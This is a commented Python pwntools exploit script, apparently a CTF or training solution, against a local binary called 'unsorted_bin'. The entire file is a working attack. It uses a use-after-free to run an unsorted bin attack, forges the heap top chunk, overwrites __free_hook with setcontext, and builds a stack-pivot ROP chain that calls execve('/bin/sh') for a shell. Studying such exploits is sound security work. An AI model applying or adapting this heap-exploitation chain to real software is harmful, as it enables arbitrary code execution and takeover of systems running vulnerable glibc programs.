#!/usr/bin/env python2
# coding = utf-8
# Environment: Ubuntu 16.04

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('choose > ')
    p.sendline(str(choice))

def new_data(id, data):
    send_choice(1)
    p.recvuntil('id : ')
    p.sendline(str(id))
    p.recvuntil('input : ')
    p.send(data)

def delete_data(id):
    send_choice(2)
    p.recvuntil('id : ')
    p.sendline(str(id))

def edit_data(id, data):
    send_choice(3)
    p.recvuntil('id : ')
    p.sendline(str(id))
    p.recvuntil('input : ')
    p.send(data)

p = process('./unsorted_bin')
elf = ELF('./unsorted_bin')
# gdb.attach(p, '')

"""
Heap Layout:
|--------------------
|(UAF) Unsorted Chunk
|--------------------
|Using Chunk (Isolating)
|--------------------
|top chunk (Lefted)
|--------------------
"""

data_bss = 0x6CCBB0

new_data(0, 'a')
new_data(1, 'a')
delete_data(0) # UAF Chunk 0
"""
Unsorted Bin Attack:
Use After Free: Point UAF Chunk's ``*bk` to fake next free unsorted bin at `(char *)&data_bss - offset(fd, struct malloc_chunk)`;
The pointer at `data_bss` (aka `&data_bss[0]`) will point at `main_arena + 88`, aka macro `unsorted_chunks (main_arena)`,
aka `(char *)&main_arena.bins[0] - offset(fd, struct malloc_chunk)`, aka `main_arena.top`.
Reference: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html
At malloc.c:3740, `(victim = unsorted_chunks (av)->bk)` as the first free unsorted bin;
At malloc.c:3742, `bck = victim->bk` as the second free unsorted bin which can be controlled via UAF;
At malloc.c:3799, `unsorted_chunks (av)->bk = bck` lead a next allocate from unsorted bin crashing the program
                    because of invalid size 0 at offset of bck->mchunk_size on `(char *)&data_bss - 0x8`;
At malloc.c:3800, ` bck->fd = unsorted_chunks (av)` write exactly on `&data_bss` with value `unsorted_chunks (av)`
                    which is `main_arena.top`.
"""
edit_data(0, p64(0) + p64(data_bss - 0x10))

"""
Fill `setcontext`'s argument in advance in the memory referenced by `data_bss[1]`,
    which executes `system("/bin/sh")`.
The function `setcontext` mainly recover the register's value (including but not limited to Data Regs & IP),
    then jump to the IP user specified.
Please understand them according to the exploit code's context.
"""
pop_rax_rdx_rbx_retn_addr = 0x480c06

"""
`execve`'s Prototype:
int execve(const char *pathname, char *const argv[], char *const envp[]);

Set RDI(First Arg, `pathname`) in SigReturnFrame, Corresponding to `&migrated_stack_payload`, whose content is "/bin/sh\x00".
Set RSI(Second Arg, `argv`) in SigReturnFrame, which must be `NULL`.
"""
setcontext_payload = '\x00' * 0x68 + p64(data_bss - 0xf0) + p64(0)
"""
Set RSP in SigReturnFrame, Corresponding to `(char *)&migrated_stack_payload + 0x10`, 
    whose content is `p64(SYS_execve_no) + p64(0) *2 + p64(syscall_addr)`,
    which is prepared for the final EXECVE SysCall.
""" 
setcontext_payload = setcontext_payload.ljust(0xa0, '\x00') + p64(data_bss - 0xe0) 
# Set RIP in SigReturnFrame to do ROP in order to control RAX (SysCall_NO) and execute `syscall`.
setcontext_payload += p64(pop_rax_rdx_rbx_retn_addr)
new_data(1, setcontext_payload)

"""
The new top_chunk position which was choosen is exactly `(char *)&data_bss - 0x100`. 
Note that every malloc_chunk size is 0x110 (Metadata 0x10 + User Mem 0x100).
In that case, we may overwrite `data_bss[0]` to get an arbitrary R/W. (We choose a `__free_hook`)
Meanwhile, `data_bss[2]` won't be corrupted because the top chunk after this alloc will only
            write domain `mchunk_size` on `data_bss[3]`, which is meaningless to us.
            (Reference: malloc.c:4099~4134)
"""
top_chunk = 0x6ccab0
last_reminder = 0
top_chunk_glibc_addr = 0x6cb858
"""
Note: We are editing content starting at `main_arena.top`.
Firstly, we can forge an arbitrary top chunk. The top chunk address was chosen according to the above reason.
Secondly, We have to clear(recover) unsorted bin's double linked list's header node due to Unsorted Bin Attack's side effect.
Recover condition (Reference: malloc.c:3740):
When `(victim = unsorted_chunks (av)->bk) == unsorted_chunks (av)`, the double linked list has no nodes.
So use `p64(top_chunk_glibc_addr) * 2` to overwrite the originals.
"""
edit_data(0, p64(top_chunk) + p64(last_reminder) + p64(top_chunk_glibc_addr) * 2)

syscall_addr = 0x40f4fa
SYS_execve_no = 59
"""
Layout the migrated Stack:
Corresponding to `setcontext_payload`'s RSP settings, respectively:
RDI -> SysCall execve's first argument C-String "/bin/sh"
'\x00' * 8 -> Useless Padding
RAX(SYS_execve_no) -> Syscall's NO: execve(59)
RDX(0) -> Syscall's third argument `envp`, which must be `NULL`
RBX(0) -> Useless Here
syscall_addr -> Invoke SysCall
"""
migrated_stack_payload = '/bin/sh\x00' + '\x00' * 8 + p64(SYS_execve_no) + p64(0) *2 + p64(syscall_addr)
# Write `__free_hook` on `data_bss[0]`
__free_hook_addr = 0x6cd608
migrated_stack_payload = migrated_stack_payload.ljust(0xf0, '\x00') + p64(__free_hook_addr)
new_data(2, migrated_stack_payload)
# Set `*__free_hook` to `setcontext`
setcontext_addr = 0x40f519
edit_data(0, p64(setcontext_addr))
delete_data(1)

"""
As a conclusion, invoking `free(data[1])` cause executing the following procedures:
free -> __free_hook -> setcontext_addr (to migrate stack on heap & place syscall's first & second arg) ->
# In this problem, one_gadget is not available.
pop_rax_rdx_rbx_retn_addr (place syscall's no, third arg, call syscall)
"""

p.interactive()
